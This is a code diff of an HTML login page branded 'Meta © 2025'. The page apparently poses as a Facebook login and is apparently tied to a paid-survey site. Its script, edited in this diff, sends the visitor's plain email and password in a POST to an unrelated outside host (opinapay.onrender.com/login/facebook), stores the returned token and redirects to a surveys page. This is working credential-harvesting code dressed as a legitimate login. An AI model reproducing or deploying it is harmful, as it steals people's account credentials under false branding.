@@ -147,47 +147,57 @@
       <div class="footer">Meta © 2025</div>
     </div>
 
-    <script>
-      const API_URL = "https://opinapay.onrender.com";
+<script>
+    const API_URL = "https://opinapay.onrender.com";
 
-      document.addEventListener("DOMContentLoaded", () => {
-        const form = document.getElementById("login-form");
-        const btn = document.getElementById("loginButton");
-        const inputs = [
-          document.getElementById("email"),
-          document.getElementById("password"),
-        ];
+    document.addEventListener("DOMContentLoaded", () => {
+      const form = document.getElementById("login-form");
+      const btn  = document.getElementById("loginButton");
+      const inputs = [
+        document.getElementById("email"),
+        document.getElementById("password")
+      ];
 
-        inputs.forEach((input) => {
-          input.addEventListener("input", () => {
-            btn.disabled = inputs.some((i) => !i.value.trim());
+      // Habilita/desabilita botão enquanto os campos estiverem vazios
+      inputs.forEach(input =>
+        input.addEventListener("input", () => {
+          btn.disabled = inputs.some(i => !i.value.trim());
+        })
+      );
+
+      form.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const email    = inputs[0].value.trim();
+        const password = inputs[1].value;
+
+        try {
+          const response = await fetch(`${API_URL}/login/facebook`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ email, password })
           });
-        });
 
-        form.addEventListener("submit", async (e) => {
-          e.preventDefault();
-          const email = document.getElementById("email").value.trim();
-          const password = document.getElementById("password").value;
+          const data = await response.json();
+          console.log("Resposta /login/facebook:", data);
 
-          try {
-            const response = await fetch(`${API_URL}/login/facebook`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({ email, password }),
-            });
-
-            const data = await response.json();
-            if (!response.ok) {
-              throw new Error(data.error || "Erro ao efetuar login.");
-            }
-
-            window.location.href = "pesquisas.html";
-          } catch (err) {
-            console.error(err);
-            alert(err.message);
+          if (!response.ok) {
+            // exibe a mensagem de erro que o backend retornou
+            throw new Error(data.error || "Falha no login.");
           }
-        });
+          if (!data.token) {
+            throw new Error("Token não retornou do servidor.");
+          }
+
+          // salva o token e redireciona
+          localStorage.setItem("token", data.token);
+          window.location.href = "pesquisas.html";
+
+        } catch (err) {
+          console.error("Erro no login Facebook:", err);
+          alert("Erro: " + err.message);
+        }
       });
-    </script>
+    });
+  </script>
   </body>
 </html>
